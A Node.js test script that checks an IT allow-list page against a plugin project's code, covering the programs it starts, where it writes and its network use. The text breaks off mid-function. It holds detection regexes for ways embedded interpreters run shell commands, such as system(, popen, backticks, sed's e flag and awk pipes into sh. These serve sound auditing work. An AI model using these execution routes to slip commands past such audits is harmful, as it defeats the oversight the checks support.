#!/usr/bin/env node
// allowlist.test.mjs: docs/IT-ALLOWLIST.md matches the code (backlog B26).
//
// The allow list tells an IT or security team what to allow on a managed laptop. A page like that is worth nothing the
// day the code starts a program it does not name, so three checks read the code itself (scripts/inventory.mjs), never a
// copy of it:
//
//   programs  every program the plugins, their hooks, the launchers and the command line start is named in section 1,
//             and every program section 1 names is started somewhere or has an entry below saying who starts it. A
//             call whose program is not a string literal is listed in DYNAMIC_CALLS with what it starts, and a call
//             this test cannot classify fails rather than being skipped.
//   reach     every place the code reaches outside a repository (homedir(), $HOME, tmpdir(), $TMPDIR) is listed in
//             OUTSIDE_A_REPOSITORY with the section 2 location it belongs to, and a new one fails.
//   writes    a scenario under an empty home folder runs the commands and hooks that set up a machine and work in a
//             project, with no SKILLITON_*, CLAUDE_CONFIG_DIR or CODEX_HOME setting to move anything, and every file
//             it leaves in that home folder is inside a location section 2 lists. A location section 2 lists that the
//             scenario never writes is reported, so the list cannot keep a location the code stopped using.
//   network   no file loads a network module, calls fetch, or runs a program or a git command that contacts a remote,
//             unless ALLOWED_NETWORK names it and section 4 says so too.
//
// The writes check needs git and ssh-keygen; it is reported as NOT RUN, never as passed, when they are missing.
//
// What these checks do not cover, so nobody reads more into a pass than is there:
//   - the two rows of section 2 about Claude Code's and Codex's own folders are exercised by the stand-in clients in
//     scripts/fixtures/clients/standin.mjs, which was written to match those rows: that pair is a check of the
//     stand-in, not of the real tools (the enrollment rehearsal measures the real ones);
//   - the words of the page are not checked, only the facts a reader can compare with the code: a sentence in it can
//     be rewritten to say the opposite and these checks stay green;
//   - `scripts/` is read only for the files the runtime itself runs (the command line, the status line setup and the
//     scrub check); the rehearsals and the delivery gate helper are not read;
//   - a program started from a name built at run time, or by a program Skilliton starts, is named by hand in the page.
//
//   node scripts/allowlist.test.mjs              exit 0 when the list matches the code, 1 when it does not, 2 when a check could not run
//   node scripts/allowlist.test.mjs --self-test  proves each check fails on known-bad input

import { execFileSync, spawnSync } from "node:child_process";
import { chmodSync, copyFileSync, existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, readlinkSync, realpathSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, relative } from "node:path";
import {
  ALLOWLIST_DOC, REPO, SHELL_BUILTINS, allowlistMachineLocations, allowlistPrograms, jsProgramCalls, locationMatches,
  networkUses, scopeFiles, section, shellCommands,
} from "./inventory.mjs";
import { PROGRAMS } from "../packs/base/plugins/workflow/runtime/lib/preflight.mjs";

const PLUGIN = "packs/base/plugins";
const WORKFLOW = `${PLUGIN}/workflow`;

// Functions that run the program their caller names, so their call sites are read the same way.
const WRAPPERS = ["runProgram", "runClient", "startOnce"];

// Every call whose program is not a string literal: what it starts, and how that is known. `count` is how many such
// call sites the file has, so a new one fails this test instead of passing under an existing entry.
export const DYNAMIC_CALLS = [
  { file: `${WORKFLOW}/runtime/lib/core.mjs`, callee: "spawnSync", arg: "file", count: 1, programs: [], why: "inside runProgram, the wrapper; every caller of it is read below" },
  { file: `${WORKFLOW}/runtime/lib/join.mjs`, callee: "spawnSync", arg: "binary.path", count: 1, programs: [], why: "inside runClient, the wrapper; every caller of it is read below" },
  { file: `${WORKFLOW}/runtime/lib/doctor.mjs`, callee: "runProgram", arg: "bin", count: 1, programs: ["claude"], why: "doctor asks a Claude Code copy bundled in an editor extension for its version" },
  { file: `${WORKFLOW}/runtime/lib/doctor.mjs`, callee: "runProgram", arg: "cli.path", count: 2, programs: ["claude"], why: "doctor runs claude plugin list and marketplace list" },
  { file: `${WORKFLOW}/runtime/commands/doctor.mjs`, callee: "runProgram", arg: "path", count: 1, programs: ["claude"], why: "doctor asks the claude on PATH for its version" },
  { file: `${WORKFLOW}/runtime/lib/join.mjs`, callee: "runClient", arg: "c.binary", count: 4, programs: ["claude", "codex"], why: "join and join --undo run each client's own marketplace and plugin commands" },
  { file: `${WORKFLOW}/runtime/lib/collectors.mjs`, callee: "spawn", arg: "check.command[0]", count: 1, programs: [], policy: true, why: "a command from the project's own delivery policy, collecting test evidence" },
  { file: `${WORKFLOW}/runtime/lib/delivery.mjs`, callee: "spawn", arg: "check.command[0]", count: 1, programs: [], policy: true, why: "a command from the shared repository's delivery policy, run by the gate" },
  { file: `${WORKFLOW}/runtime/lib/gate.mjs`, callee: "spawn", arg: "run.argv[0]", count: 1, programs: [], policy: true, why: "a command from the project's own delivery policy, run locally by skilliton gate" },
  { file: `${WORKFLOW}/runtime/lib/gate.mjs`, callee: "spawn", arg: "run.shell", count: 1, programs: ["sh", "npm"], why: "skilliton gate runs npm run verify (package.json's verify script), or the command a person gave after --cmd, through the shell" },
  { file: `${WORKFLOW}/runtime/lib/delivery-install.mjs`, callee: "runProgram", arg: "runtimePath", count: 1, programs: ["bash", "node"], why: "delivery install probes the workflow plugin's bin/skilliton launcher, a bash script that runs node" },
  { file: `${WORKFLOW}/runtime/lib/usage.mjs`, callee: "runProgram", arg: "process.execPath", count: 2, programs: ["node"], why: "skilliton usage runs the project's own meter (scripts/token-cost.mjs) and, before believing a number from it, the test beside it" },
  { file: `${WORKFLOW}/runtime/lib/preflight.mjs`, callee: "spawn", arg: "file", count: 1, programs: [], why: "inside startOnce, the wrapper that waits for one program in its own process group and kills the group when it will not stop; every caller of it is read below" },
  { file: `${WORKFLOW}/runtime/lib/preflight.mjs`, callee: "startOnce", arg: "bash.path", count: 1, programs: ["bash"], why: "on Windows the probe script is run by Git Bash, which is how Claude Code runs a hook there" },
  { file: `${WORKFLOW}/runtime/lib/preflight.mjs`, callee: "startOnce", arg: "probe", count: 1, programs: ["env", "bash"], why: "preflight runs the plugin's own probe script by its path, so its first line starts env and bash, the way Claude Code runs a hook" },
  { file: `${WORKFLOW}/runtime/lib/preflight.mjs`, callee: "startOnce", arg: "path", count: 1, programs: [], table: "PROGRAMS", why: "preflight starts each program from the PROGRAMS table in the same file once, with --version; the table is checked against section 1 below" },
];

// Programs that run whatever file or text they are given, so what they are given has to be read too. awk is one of
// them: its first argument is a program, and that program can start commands (system(), a pipe into getline).
const INTERPRETERS = ["bash", "sh", "dash", "ksh", "zsh", "node", "python", "python3", "perl", "ruby", "php", "osascript", "awk", "gawk", "nawk", "mawk"];
const AWK = ["awk", "gawk", "nawk", "mawk"];
const SED = ["sed", "gsed"];
// Options that ask a program to describe itself and then exit. -v is one of them for node, perl and ruby, and is
// NOT one for a shell (bash -v reads its program from its input and prints it) or for python (-v is verbose), so it
// is listed per interpreter rather than in the general set.
const SELF_DESCRIBING_LONG = /^(--version|--help|--usage)$/;
const SHELLS = ["bash", "sh", "dash", "ksh", "zsh"];
// Options that take a separate value, which is not the program however much it looks like one: without this,
// `bash -O extglob -s` has "extglob" as its first non-option word and the -s below reads as the script's own.
const VALUE_OPTIONS = { bash: ["-O", "+O", "-o", "+o", "--rcfile", "--init-file"], sh: ["-o", "+o"], dash: ["-o", "+o"], ksh: ["-o", "+o"], zsh: ["-o", "+o"], awk: ["-v"], gawk: ["-v"], nawk: ["-v"], mawk: ["-v"] };
// The short spellings are only self-describing for the programs that read them that way. For a shell, -h is
// hashall and -v is verbose, and a shell with neither a script nor -c then reads its program from its input, which
// is the thing this rule is for; node, perl and ruby print their version for -v.
const SELF_DESCRIBING_SHORT = { node: ["-v", "-V", "-h"], perl: ["-v", "-V", "-h"], ruby: ["-v", "-h"], python: ["-V", "-h"], python3: ["-V", "-h"], php: ["-v", "-h"], osascript: ["-h"] };
const selfDescribing = (base, arg) => SELF_DESCRIBING_LONG.test(arg) || (SELF_DESCRIBING_SHORT[base] ?? []).includes(arg);
// Ways of saying "the program arrives on my input", which is what this rule is about and all of which are
// option-shaped: a bare - in the place the program would be, a shell's -s among its leading options (alone or in a
// group, bash -si), and awk's -f -. An argument after one of these is the program's own argument, not the program,
// so the file name that follows proves nothing.
//
// `first` is where the first argument that is not an option sits, and it is what keeps this from firing on ordinary
// lines: `awk -f prog.awk -` reads its DATA from the input and its program from a file, and `bash script.sh -s`
// passes -s to the script. Both were reported before this took the position into account.
function readsItsInput(base, args, first) {
  return args.some((a, i) => {
    if (a === "-") return first === i;
    // A shell takes its options with a minus or a plus (sh +s -s is a real invocation), and either spelling of a
    // group containing s means "read the program from the input".
    if (SHELLS.includes(base) && typeof a === "string" && /^[-+][A-Za-z]*s[A-Za-z]*$/.test(a)) return first < 0 || i < first;
    return AWK.includes(base) && (a === "-f-" || (a === "-f" && args[i + 1] === "-"));
  });
}
// GNU sed's two ways of running a command: `e` as a command of its own, and `e` as a flag on a substitution.
const SED_RUNS_A_COMMAND = [/(?:^|;|\n)\s*[0-9,~$+]*\s*e(?:\s|;|$)/, /s(.)(?:\\.|(?!\1)[^\\])*\1(?:\\.|(?!\1)[^\\])*\1[a-zA-Z0-9]*e/];
// Ways an embedded program starts a command of its own, which this reader cannot follow. The common list holds the
// shapes that mean the same thing in every language here; the rest are read per language, because a backtick is a
// command in Perl and Ruby and an ordinary string in JavaScript, and `exec(` runs a program in Perl while it
// compiles text in Python.
const EMBEDDED_COMMANDS = [/\bsystem\s*\(/, /\|\s*&?\s*getline\b/, /\bpopen\s*\(/, /\bsubprocess\b/, /\bos\.system\b/, /child_process/];
// awk's print ... | "a command" starts a program. A | inside the text being printed (print $1 "|" $2) does not, so
// this one is read with the quoted strings taken out first. Only for awk: taking strings out of a program in any
// other language would take the name of what it starts with them.
// Not || , which is an ordinary condition: print (a || b) is not a pipe into anything.
const AWK_PIPE = /\bprintf?\b[^;]*(?<!\|)\|(?!\|)/;
// Regular expressions first, then strings: a quote inside /"/ is not the start of a string, and reading it as one
// swallowed the rest of the line, so `print $0 | "sh"` disappeared from what this rule could see.
const withoutStrings = (text) => text
  .replace(/\/(?:\\.|[^/\\\n])+\//g, "//")
  .replace(/"(?:\\.|[^"\\])*"/g, '""');
const EMBEDDED_BY_LANGUAGE = {
  perl: [/`/, /\bqx\s*[({\[/|!'"]/, /\bopen\s*\([^)]*["'][|-]/, /\bexec\s*[({"']/, /\bfork\s*[(;]/],
  ruby: [/`/, /\bIO\.popen\b/, /\bexec\s*[({"']/, /\bspawn\s*[({"']/, /\bKernel\./],
  python: [/\bos\.(exec|spawn|posix_spawn|popen|fork)/, /\bpty\.(spawn|fork)/, /\bcommands\.getoutput\b/],
  python3: [/\bos\.(exec|spawn|posix_spawn|popen|fork)/, /\bpty\.(spawn|fork)/, /\bcommands\.getoutput\b/],
  osascript: [/\bdo shell script\b/i],
  node: [/\bprocess\.binding\b/, /\bDeno\.Command\b/],
};
const embeddedPatterns = (base) => [...EMBEDDED_COMMANDS, ...(EMBEDDED_BY_LANGUAGE[base] ?? [])];
// True when an embedded program starts a command of its own, as far as this reader can tell.
const startsACommand = (base, program) => embeddedPatterns(base).some((re) => re.test(program))
  || (AWK.includes(base) && AWK_PIPE.test(withoutStrings(program)));

// Every place a script hands an interpreter something this reader cannot follow: a path built from a variable
// ("expansion") or a program written into the script itself ("inline"). `target`, when given, is a file this test must
// already read; `count` is how many such places the file has, so a new one has to be looked at.
export const INTERPRETER_TARGETS = [
  { file: `${PLUGIN}/guardrails/hooks/session-start-guardrails.sh`, command: "bash", kind: "expansion", count: 1, target: `${PLUGIN}/guardrails/hooks/guard-bash.sh`, why: "the guardrails hook beside it, asked for the one status line it prints" },
  { file: `${WORKFLOW}/bin/skilliton`, command: "node", kind: "expansion", count: 1, target: `${WORKFLOW}/runtime/skilliton.mjs`, why: "the runtime this launcher exists to start" },
  { file: `${PLUGIN}/guardrails/hooks/guard-bash.sh`, command: "node", kind: "inline", count: 2, target: null, why: "two short programs written into this file, reading the hook's JSON input and a project's settings" },
  { file: `${PLUGIN}/guardrails/hooks/guard-bash.sh`, command: "python3", kind: "inline", count: 2, target: null, why: "the same two programs in Python, for a machine with no jq and no node" },
  { file: `${WORKFLOW}/hooks/session-start-handoff.sh`, command: "node", kind: "inline", count: 2, target: null, why: "two short programs written into this file, reading the hook's input and the project's settings" },
  { file: `${WORKFLOW}/hooks/session-start-handoff.sh`, command: "python3", kind: "inline", count: 2, target: null, why: "the same two programs in Python" },
  { file: "scripts/scrub-check.sh", command: "bash", kind: "expansion", count: 2, target: "scripts/scrub-check.sh", why: "its own self-test runs this same script twice, to prove each scan can fail" },
  { file: `${PLUGIN}/context-hygiene/hooks/session-start-checklist.sh`, command: "awk", kind: "inline", count: 1, target: null, why: "the program that takes one bounded section out of the lessons file; it starts nothing" },
  { file: `${PLUGIN}/guardrails/hooks/guard-bash.sh`, command: "awk", kind: "inline", count: 1, target: null, why: "the program that splits a shell command into words for the guardrails check; it starts nothing" },
];

// Commands in a shell script whose program is an expansion: what they run, how many such commands the file has, and
// the arguments they are given, so the command can neither multiply nor change into something else unnoticed.
export const SHELL_DYNAMIC = [
  { file: `${WORKFLOW}/runtime/preflight/probe.sh`, text: '"$path"', count: 1, args: ["--version"], why: "the program the preflight check asked about, found with command -v; the names come from the PROGRAMS table in runtime/lib/preflight.mjs" },
  { file: `${WORKFLOW}/evals/security-status-honest/fixture.sh`, text: '"$skilliton"', count: 1, args: null, why: "this plugin's own bin/skilliton, setting up an evaluation case; eval fixtures run only in a company's evaluation runs" },
  { file: `${WORKFLOW}/evals/task-start-records-work/fixture.sh`, text: '"$skilliton"', count: 1, args: null, why: "the same" },
];

// Programs the allow list names that Skilliton does not start itself, with what does.
export const STARTED_BY_OTHERS = [
  ["ssh-keygen", "git starts it to make and check SSH signatures (gpg.format=ssh), in verify, join and release"],
  ["/bin/sh", "Claude Code runs each hook command through a shell (sh -c on macOS and Linux), and the launcher join writes begins with #!/bin/sh"],
  ["sh", "the same shell, named without its path"],
];

// Where the code reaches outside a repository, and the section 2 location each belongs to. The text is matched
// against the file, so changing one of these lines brings someone back to this list and to the allow list.
export const OUTSIDE_A_REPOSITORY = [
  [`${WORKFLOW}/runtime/lib/core.mjs`, "const HOME = homedir();", "the backups folder ~/.claude/backups/skilliton/ and short paths in messages"],
  [`${WORKFLOW}/runtime/lib/join.mjs`, 'process.env.SKILLITON_JOIN_DIR || join(homedir(), ".config", "skilliton", "joined")', "~/.config/skilliton/joined/<company>.json"],
  [`${WORKFLOW}/runtime/lib/join.mjs`, 'binDir ?? join(homedir(), ".local", "bin")', "~/.local/bin/skilliton"],
  [`${WORKFLOW}/runtime/lib/trust.mjs`, 'process.env.SKILLITON_TRUST_DIR || join(homedir(), ".config", "skilliton", "trust")', "~/.config/skilliton/trust/<company>.allowed_signers"],
  [`${WORKFLOW}/runtime/lib/verify.mjs`, 'process.env.CLAUDE_CONFIG_DIR || join(homedir(), ".claude")', "Claude Code's own folder, read, and written by its own commands"],
  [`${WORKFLOW}/runtime/lib/verify.mjs`, 'process.env.CODEX_HOME || join(homedir(), ".codex")', "Codex's own folder, read, and created by join when it is missing"],
  [`${WORKFLOW}/runtime/lib/preflight.mjs`, "process.env.HOME !== pinned.home", "nothing: it compares this session's home folder with the one the system records, to say which the reachability check read"],
  [`${WORKFLOW}/runtime/lib/preflight.mjs`, "the home folder the system records for this user", "nothing: the same comparison, printed"],
  [`${WORKFLOW}/runtime/lib/legacy-names.mjs`, 'join(homedir(), ".config", OLD)', "the folder used before the rename, named in messages and never written"],
  [`${WORKFLOW}/runtime/lib/delivery.mjs`, 'mkdtempSync(join(tmpdir(), "skilliton-delivery-"))', "$TMPDIR/skilliton-delivery-*, removed when the gate finishes"],
  [`${WORKFLOW}/runtime/commands/propose.mjs`, 'mkdtempSync(join(tmpdir(), "skilliton-propose-"))', "$TMPDIR/skilliton-propose-*, removed when propose finishes"],
  [`${WORKFLOW}/runtime/commands/join.mjs`, 'mkdtempSync(joinPath(tmpdir(), "skilliton-join-"))', "$TMPDIR/skilliton-join-*, the signers text from a join file held for the trust step and removed when join finishes"],
  [`${WORKFLOW}/runtime/lib/preflight.mjs`, 'resolve(binDir ?? join(homedir(), ".local", "bin"))', "~/.local/bin, tested with a file the check removes again"],
  [`${WORKFLOW}/runtime/lib/preflight.mjs`, "{ path: tmpdir(), what:", "the temporary folder, tested the same way"],
  [`${WORKFLOW}/runtime/lib/preflight.mjs`, 'mkdtempSync(join(tmpdir(), "skilliton-preflight-git-"))', "an empty folder in the temporary folder, so the reachability check reads no repository's configuration; removed again straight away"],
  [`${WORKFLOW}/runtime/lib/preflight.mjs`, "madeTemp = makeFolderChain(tmpdir())", "the temporary folder, made again for the reachability check after the folder test removed it, and taken away again with every folder that had to be made for it"],
  [`${WORKFLOW}/runtime/lib/preflight.mjs`, "the temporary folder ${tilde(tmpdir())} could not be used", "the message that names the temporary folder when it cannot be used"],
  [`${PLUGIN}/context-hygiene/hooks/statusline-quota.sh`, 'LOG="${SKILLITON_USAGE_LOG:-$HOME/.claude/skilliton/usage-log.jsonl}"', "~/.claude/skilliton/usage-log.jsonl"],
  [`${PLUGIN}/context-hygiene/hooks/read-guard.mjs`, ': join(homedir(), ".claude", "skilliton", "read-guard.log");', "~/.claude/skilliton/read-guard.log, one line per refused read"],
  [`${PLUGIN}/context-hygiene/hooks/statusline-quota.sh`, 'KEYS_LOG="${SKILLITON_KEYS_LOG:-$HOME/.claude/skilliton/statusline-keys-seen.log}"', "~/.claude/skilliton/statusline-keys-seen.log"],
  [`${PLUGIN}/context-hygiene/hooks/config-drift-check.sh`, 'SETTINGS="${SKILLITON_SETTINGS:-$HOME/.claude/settings.json}"', "Claude Code's settings, read only"],
  [`${PLUGIN}/context-hygiene/hooks/config-drift-check.sh`, 'PROJECTS="${SKILLITON_PROJECTS:-$HOME/.claude/projects}"', "Claude Code's transcripts, read only"],
  [`${PLUGIN}/guardrails/hooks/guard-bash.sh`, "'~') RESOLVED=${HOME:-} ;;", "reads HOME to work out which folder a command would run in"],
  [`${PLUGIN}/guardrails/hooks/guard-bash.sh`, `'~/'*) if [ -n "\${HOME:-}" ]; then RESOLVED="$HOME/\${a#'~/'}"; else RESOLVED=""; fi ;;`, "the same"],
  [`${PLUGIN}/guardrails/hooks/guard-bash.sh`, 'if [ "$k" -ge "$n" ]; then EFF_DIR=${HOME:-}; return 0; fi', "the same, for a bare cd"],
  ["scripts/setup.mjs", "const HOME = homedir();", "~/.claude/settings.json and ~/.claude/backups/skilliton/, for the optional status line"],
  [`${WORKFLOW}/runtime/lib/core.mjs`, 'const BACKUPS = process.env.SKILLITON_BACKUPS || join(HOME, ".claude", "backups", "skilliton")', "~/.claude/backups/skilliton/, the copy taken before a file outside a repository is changed"],
  [`${WORKFLOW}/runtime/lib/core.mjs`, "const dir = join(BACKUPS, command,", "a folder per command and time under that backups folder"],
  [`${WORKFLOW}/runtime/lib/doctor.mjs`, 'const ext = join(HOME, editor, "extensions")', "editor extension folders, read by doctor to find a bundled Claude Code"],
  [`${WORKFLOW}/runtime/lib/doctor.mjs`, '{ label: "~/.claude/settings.json", path: join(HOME, ".claude", "settings.json") }', "Claude Code's settings, read by doctor"],
  [`${WORKFLOW}/runtime/lib/doctor.mjs`, 'const knownPath = join(HOME, ".claude", "plugins", "known_marketplaces.json")', "Claude Code's marketplace records, read by doctor"],
  [`${WORKFLOW}/runtime/lib/doctor.mjs`, 'const installedPath = join(HOME, ".claude", "plugins", "installed_plugins.json")', "Claude Code's install records, read by doctor"],
  [`${WORKFLOW}/runtime/lib/lifecycle.mjs`, 'const installsPath = join(HOME, ".claude", "plugins", "installed_plugins.json")', "Claude Code's install records, read by the session start so it can say whether the plugins this project enables are installed for this user"],
  [`${WORKFLOW}/runtime/lib/doctor.mjs`, 'isFile(join(HOME, ".claude.json"))', "whether Claude Code has ever run under this home folder, read by doctor"],
  ["scripts/setup.mjs", 'const SETTINGS = process.env.SKILLITON_SETTINGS ?? join(HOME, ".claude", "settings.json")', "~/.claude/settings.json, where the optional status line is set"],
  ["scripts/setup.mjs", 'const BACKUPS = process.env.SKILLITON_BACKUPS ?? join(HOME, ".claude", "backups", "skilliton")', "~/.claude/backups/skilliton/, the copy taken before the settings are changed"],
  ["scripts/setup.mjs", 'const earlier = join(HOME, ".claude", "backups", ', "the backups folder used before the rename, named in a message and never read"],
  ["scripts/setup.mjs", "const bdir = join(BACKUPS, dirs[dirs.length - 1])", "the newest backup, read by --undo"],
  ["scripts/setup.mjs", "const bdir = join(BACKUPS, stamp)", "the backup this run writes"],
  ["scripts/scrub-check.sh", 'DENY="${SKILLITON_DENYLIST:-$HOME/.config/skilliton/denylist}"', "the private denylist, read only"],
  ["scripts/scrub-check.sh", 'LEGACY_DENY="$HOME/.config/', "the denylist location used before the rename, named and never read"],
  ["scripts/scrub-check.sh", 'hits=$(printf \'%s\\n\' "$files" | tr \'\\n\' \'\\0\' | xargs -0 grep -H -I -n -E "$HOMEPATH" 2>/dev/null)', "a pattern for home paths in files, not a folder"],
  ["scripts/scrub-check.sh", 'n=$(printf \'%s\\n\' "$log" | grep -c -E "$HOMEPATH")', "the same pattern"],
];
// Also the module-level constants a file may reuse (core.mjs's HOME and BACKUPS), so a new path built from one of
// them is a new place the code reaches, not an invisible line.
const OUTSIDE_RE = /homedir\(\)|process\.env\.HOME|tmpdir\(\)|\$\{?HOME\}?|\$\{?TMPDIR|(?:join|resolve)\(\s*(?:HOME|BACKUPS)\b/;

// Network use the allow list permits. Each entry must also be named in section 4; with none, section 4 says the code
// makes no requests of its own, and this test holds it to that.
export const ALLOWED_NETWORK = [
  { file: `${WORKFLOW}/runtime/lib/preflight.mjs`, text: '"ls-remote"', docPhrase: "git ls-remote --heads https://github.com/<owner>/<repo>", why: "the preflight check asks whether this machine can reach the company's plugin repository" },
];

const GIT_WRAPPERS = { [`${PLUGIN}/guardrails/hooks/guard-bash.sh`]: ["g"] };

// A file under the plugins that cannot be read (a link pointing nowhere, a mode this user may not read, a file
// removed while the check ran) is a finding, and never a crash: every check here reads through this one function,
// which records the file and returns nothing rather than throwing out of the middle of a rule. A reader that stops
// has checked nothing, and the run would end naming one rule when the others never ran at all.
function makeReader(root, seen) {
  const reader = (path) => {
    try {
      // Checked before it is opened: reading a pipe or a device never returns, and a check that hangs is worse than
      // one that fails, because nothing says what it was waiting for.
      const st = statSync(join(root, path));
      if (!st.isFile()) { seen.set(path, "not a plain file"); return ""; }
      return readFileSync(join(root, path), "utf8");
    } catch (e) { seen.set(path, e.code ?? e.message); return ""; }
  };
  reader.unreadable = seen; // so a caller handed this reader can ask what it could not read
  return reader;
}
const unreadable = new Map();
const read = makeReader(REPO, unreadable);

export function checkUnreadable(seen = unreadable, notRegular = []) {
  return [...notRegular.map((n) => `${n.path} was not read because ${n.why}`), ...[...seen].map(([path, why]) => `${path} could not be read (${why}), so nothing about what it starts or writes was checked`)];
}

// Null when the file could not be read, so a check that compares a list against the code can say NOT RUN instead of
// comparing against an incomplete list. A reader passed in by a test may still throw; that is recorded the same way.
function readOrNull(readFile, path, problems) {
  try {
    const text = readFile(path);
    // The reader carries its own record of what it could not read, so a check handed a different reader is not
    // silently told that an unreadable file was an empty one.
    return readFile.unreadable?.has(path) ? null : text;
  } catch (e) { problems.push(`${path} could not be read (${e.code ?? e.message}), so nothing about it was checked`); return null; }
}
const sorted = (set) => [...set].sort();

// Files under the plugins that neither reader covers. A file nothing reads can start anything: a hook that sources
// hooks/common.bash, or a helper written in another language, would be invisible to every check below.
export function checkEveryFileIsRead(files) {
  return (files.other ?? []).map((path) => `${path} is under the plugins but is neither a script nor JavaScript this test reads, so nothing checks what it starts; give it a .sh or .mjs name, or a first line naming its interpreter, or take it out of the plugin`);
}

// ---------- programs ----------

// Every program the code starts: Map(program -> [where it is started]). Anything that cannot be classified is a
// problem, never a silent skip.
export function programsFromCode(files = scopeFiles(), readFile = read, shellDynamic = SHELL_DYNAMIC.map((e) => ({ ...e })), interpreterTargets = INTERPRETER_TARGETS.map((e) => ({ ...e }))) {
  const found = new Map();
  const problems = [];
  const add = (program, where) => { if (!found.has(program)) found.set(program, []); found.get(program).push(where); };

  for (const path of files.shell) {
    const text = readOrNull(readFile, path, problems);
    if (text === null) continue;
    const { commands, dynamic, functions, problems: shellProblems } = shellCommands(text);
    for (const p of shellProblems) problems.push(`${path}:${p.line}: ${p.text}`);
    for (const d of dynamic) {
      const entry = shellDynamic.find((e) => e.file === path && e.text === d.text);
      if (!entry) { problems.push(`${path}:${d.line}: the command ${d.text} is an expansion, so the program it starts cannot be read; add it to SHELL_DYNAMIC in scripts/allowlist.test.mjs with what it runs`); continue; }
      entry.seen = (entry.seen ?? 0) + 1;
      const given = d.args.map((a) => a ?? "<a variable>");
      if (entry.args && JSON.stringify(given) !== JSON.stringify(entry.args)) {
        problems.push(`${path}:${d.line}: ${d.text} is now given ${given.join(" ") || "no arguments"}, and SHELL_DYNAMIC in scripts/allowlist.test.mjs says ${entry.args.join(" ")}; what this starts has changed`);
      }
    }
    // An interpreter runs whatever it is given, so the file or program it is given is read too, or said out loud.
    for (const c of commands) {
      const base = c.word.split("/").pop();
      // awk takes -v name=value pairs before its program, and the program itself is not a file.
      const isAwk = AWK.includes(base);
      // sed is not in the interpreter list, but GNU sed runs commands: the `e` command, and the `e` flag on s///.
      // A rule that reads only the program's name would never see it.
      if (SED.includes(base)) {
        for (const a of c.args) {
          if (typeof a === "string" && SED_RUNS_A_COMMAND.some((re) => re.test(a))) {
            problems.push(`${path}:${c.line}: the sed program here can run a command (${a.trim().slice(0, 60)}); sed's e command and the e flag on s/// start a shell, which this reader cannot follow`);
          }
        }
      }
      if (!INTERPRETERS.includes(base)) continue;
      // Where the first argument that is not an option sits, read once and used by both rules below.
      const takesAValue = VALUE_OPTIONS[base] ?? [];
      const firstArgument = c.args.findIndex((a, i) => {
        if (takesAValue.includes(c.args[i - 1])) return false; // the value of an option, not the program
        return !(typeof a === "string" && /^[-+]/.test(a) && a !== "-");
      });
      // Said before the arguments are read for a file name: under -s or -, the first argument is the program's own
      // argument and naming a file this test reads would otherwise end the check with nothing said.
      if (readsItsInput(base, c.args, firstArgument)) {
        problems.push(`${path}:${c.line}: it runs ${base} in a way that takes its program from its input (${c.args.filter((a) => typeof a === "string").join(" ")}), so what runs cannot be read from this line`);
        continue;
      }
      // A here-document is the program, whatever the arguments say: `node <<EOF ... EOF` hands node a program on its
      // input. It is read for the one thing that matters here, and has to be named in the table like any other
      // program written into a script.
      if (typeof c.heredoc === "string") {
        if (startsACommand(base, c.heredoc)) problems.push(`${path}:${c.line}: the ${base} program in the here-document here starts a command of its own (${c.heredoc.trim().slice(0, 60)}), which this reader cannot follow`);
        const entry = interpreterTargets.find((e) => e.file === path && e.command === base && e.kind === "here-document");
        if (!entry) { problems.push(`${path}:${c.line}: it runs ${base} with a program in a here-document, which this reader follows only far enough to see whether it starts a command; add it to INTERPRETER_TARGETS in scripts/allowlist.test.mjs with what it runs`); continue; }
        entry.seen = (entry.seen ?? 0) + 1;
        continue;
      }
      let first = -1;
      for (let i = 0; i < c.args.length; i++) {
        const a = c.args[i];
        if (isAwk && a === "-v") { i++; continue; }
        if (a !== null && a !== undefined && a.startsWith("-")) continue;
        first = i;
        break;
      }
      // An interpreter with no program of its own runs whatever reaches its input: a pipe, a process substitution,
      // a here-document (handled above). None of that can be read from this line, so it is said out loud. A command
      // answering about itself (node --version, bash --help) reads nothing and is left alone; that is the whole
      // exemption, because every way of saying "read the program from standard input" is also option-shaped
      // (bash -s, sh -, python3 -, awk -f-), and exempting option-shaped arguments in general would exempt exactly
      // the case this rule exists for.
      if (first < 0 && c.args.length > 0 && c.args.every((a) => typeof a === "string" && selfDescribing(base, a))) continue;
      if (first < 0) { problems.push(`${path}:${c.line}: it runs ${base} with no file or program of its own, so whatever arrives on its input runs; this reader cannot follow that`); continue; }
      const given = c.args[first];
      const optionBefore = first > 0 ? c.args[first - 1] : null;
      const inlineOption = optionBefore !== null && optionBefore !== undefined && /^-[A-Za-z]*[ec]$/.test(optionBefore);
      const kind = inlineOption || (isAwk && optionBefore !== "-f") ? "inline" : given === null ? "expansion" : "path";
      if (kind === "inline" && given !== null) {
        // An embedded program is read for the one thing this reader cares about: whether it starts a command.
        if (startsACommand(base, given)) problems.push(`${path}:${c.line}: the ${base} program written here starts a command of its own (${given.trim().slice(0, 60)}), which this reader cannot follow`);
      }
      if (kind === "path") {
        const resolved = given.replace(/^\.\//, "");
        const known = [...files.shell, ...files.js].some((f) => f === resolved || f.endsWith(`/${resolved}`));
        if (!known) problems.push(`${path}:${c.line}: it runs ${base} ${given}, a file this test does not read; whatever is in that file runs`);
        continue;
      }
      const entry = interpreterTargets.find((e) => e.file === path && e.command === base && e.kind === kind);
      if (!entry) { problems.push(`${path}:${c.line}: it runs ${base} with ${kind === "inline" ? "a program written into the script" : "a file named by an expansion"}, which this reader cannot follow; add it to INTERPRETER_TARGETS in scripts/allowlist.test.mjs with what it runs`); continue; }
      entry.seen = (entry.seen ?? 0) + 1;
      if (entry.target && !files.shell.includes(entry.target) && !files.js.includes(entry.target)) {
        problems.push(`${path}:${c.line}: INTERPRETER_TARGETS says it runs ${entry.target}, which this test does not read`);
      }
    }

    // A file a script reads with . or source runs as part of it, so it has to be a file this test reads too.
    for (const { path: sourced, line } of (shellCommands(text).sourced ?? [])) {
      if (sourced === null) { problems.push(`${path}:${line}: a file read with . or source is named by an expansion, so what it runs cannot be read`); continue; }
      const resolved = sourced.replace(/^\.\//, "");
      if (!files.shell.some((f) => f.endsWith(`/${resolved}`) || f === resolved)) {
        problems.push(`${path}:${line}: it reads ${sourced} with . or source, which this test does not read; that file runs as part of this one`);
      }
    }
    for (const c of commands) {
      if (SHELL_BUILTINS.has(c.word) || functions.includes(c.word)) continue;
      add(c.word, `${path}:${c.line}`);
      if (c.word.includes("/")) add(c.word.split("/").pop(), `${path}:${c.line}`);
    }
    const shebang = /^#!\s*(\S+)(?:\s+(\S+))?/.exec(text);
    if (shebang) {
